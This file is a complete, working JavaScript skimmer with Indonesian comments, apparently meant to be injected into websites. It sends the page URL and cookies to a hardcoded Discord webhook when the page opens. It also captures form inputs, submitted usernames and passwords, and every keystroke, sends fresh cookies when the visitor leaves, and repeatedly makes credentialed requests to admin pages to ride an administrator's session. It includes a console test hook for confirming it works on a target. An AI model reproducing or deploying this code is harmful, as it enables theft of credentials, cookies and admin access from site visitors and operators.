(function(){
  "use strict";

  var WH = "https://discord.com/api/webhooks/1516627039753605140/8VNqYb-cIYMLTg4dBoS1g2exxqGa4I51eQb8fU-xo9l8x1U2AjQR7Bs7MCkyQFrPR_GV";

  /* ============ 1. SENDER (queue + anti rate-limit Discord) ============ */
  var queue = [], busy = false;
  function send(msg){
    msg = String(msg);
    for (var i = 0; i < msg.length; i += 1900) queue.push(msg.slice(i, i + 1900));
    if (!busy) pump();
  }
  function pump(){
    if (!queue.length) { busy = false; return; }
    busy = true;
    var m = queue.shift();
    var xhr = new XMLHttpRequest();
    xhr.open("POST", WH, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function(){
      if (xhr.readyState === 4) {
        if (xhr.status === 429) { queue.unshift(m); setTimeout(pump, 5000); return; }
        setTimeout(pump, 1100);
      }
    };
    xhr.send(JSON.stringify({ content: m }));
  }

  /* ============ 2. INFO HALAMAN (domain + URL lengkap + cookie) ============ */
  function infoHalaman(){
    send(
      "👁️ HALAMAN DIBUKA\n" +
      "Domain : " + document.domain + "\n" +
      "URL    : " + location.href + "\n\n" +
      "🍪 Cookie : " + (document.cookie || "(kosong)")
    );
  }

  /* ============ 3. INPUT GRABBER (debounce 1 detik, anti-spam) ============ */
  var timers = {}, idx = 0;
  document.addEventListener("input", function(e){
    var t = e.target;
    if (!t || (t.tagName !== "INPUT" && t.tagName !== "TEXTAREA")) return;
    var tp = (t.type || "text").toLowerCase();
    if (tp === "password" || tp === "email" || tp === "text" ||
        tp === "tel" || tp === "number") {
      var key = t.name || t.id || "f" + (++idx);
      clearTimeout(timers[key]);
      timers[key] = setTimeout(function(){
        send(
          "📥 INPUT\n" +
          "URL   : " + location.href + "\n" +
          "Field : " + (t.name || t.id || "(no-name)") + " [" + tp + "]\n" +
          "Isi   : " + (t.value || "")
        );
      }, 1000);
    }
  }, true);

  /* ============ 4. FORM SUBMIT (username + password + CSRF) ============ */
  document.addEventListener("submit", function(e){
    var f = e.target;
    if (!f || typeof f.querySelectorAll !== "function") return;
    var baris = [], inputs = f.querySelectorAll("input, textarea, select");
    for (var i = 0; i < inputs.length; i++){
      var el = inputs[i];
      var tp = (el.type || "text").toLowerCase();
      if (tp === "hidden" || tp === "button" || tp === "submit" ||
          tp === "image" || tp === "reset" || tp === "file") continue;
      var icon = tp === "password" ? "🔑" : (tp === "email" ? "📧" : "📎");
      baris.push(icon + " [" + tp + "] " + (el.name || el.id || "(no-name)") + " : " + (el.value || ""));
    }
    if (!baris.length) return;
    send("🛡️ FORM SUBMIT\nURL : " + location.href + "\n\n" + baris.join("\n"));
  }, true);

  /* ============ 5. KEYLOGGER (batch tiap 4 detik) ============ */
  var keys = [], kt = null;
  document.addEventListener("keydown", function(e){
    var k = e.key;
    var map = {Enter:"[ENT]", Backspace:"[BS]", Tab:"[TAB]", Shift:"[SHIFT]",
               Control:"[CTRL]", Alt:"[ALT]", CapsLock:"[CAPS]",
               ArrowUp:"[↑]", ArrowDown:"[↓]", ArrowLeft:"[←]", ArrowRight:"[→]"};
    if (map[k]) k = map[k];
    else if (k && k.length > 1) k = "[" + k.toUpperCase() + "]";
    keys.push(k);
    if (keys.length >= 60) flushKeys();
    else { clearTimeout(kt); kt = setTimeout(flushKeys, 4000); }
  });
  function flushKeys(){
    if (!keys.length) return;
    var d = keys.join(""); keys = [];
    send("⌨️ KEYLOG\nURL : " + location.href + "\nIsi : " + d);
  }

  /* ============ 6. COOKIE TERBARU (tiap pindah halaman / keluar) ============ */
  function grabCookies(){
    if (document.cookie)
      send("🍪 COOKIES TERBARU\nURL : " + location.href + "\n\n" + document.cookie);
  }
  window.addEventListener("pagehide", function(){ flushKeys(); grabCookies(); });

  /* ============ 7. SESSION RIDING (baca halaman admin — HttpOnly tetap jalan) ============ */
  var RIDE = ["/admin", "/admin/", "/admin/index.php", "/admin/dashboard.php", "/panel", "/dashboard"];
  function ride(){
    var n = 0;
    RIDE.forEach(function(p){
      if (n >= 3) return;
      var xhr = new XMLHttpRequest();
      xhr.open("GET", p, true);
      xhr.withCredentials = true;   // cookie httpOnly ikut otomatis
      xhr.onreadystatechange = function(){
        if (xhr.readyState !== 4 || xhr.status !== 200) return;
        var html = xhr.responseText || "";
        var title = (html.match(/<title[^>]*>([^<]*)<\/title>/i) || [])[1] || "";
        var text = html.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim();
        if (/(welcome|selamat datang|dashboard|logout|profile|admin panel)/i.test(text.slice(0, 2000)) ||
            /(admin|dashboard|panel|logout)/i.test(title)) {
          n++;
          send("🔓 SESSION RIDING OK\nURL : " + location.origin + p + "\nTitle : " + title + "\n\n" + text.slice(0, 600));
        }
      };
      try { xhr.send(null); } catch(err) {}
    });
  }

  /* ============ INIT ============ */
  infoHalaman();            // langsung kirim domain + URL + cookie pas halaman kebuka
  setTimeout(ride, 2000);   // coba baca halaman admin (jalan walau HttpOnly)
  setInterval(ride, 20000); // coba lagi tiap 20 detik — nangkep kondisi SETELAH admin login
  setInterval(flushKeys, 4000);

  // Test: ketik __test() di console halaman target
  window.__test = function(){ send("✅ TEST OK dari " + document.domain); };
})();
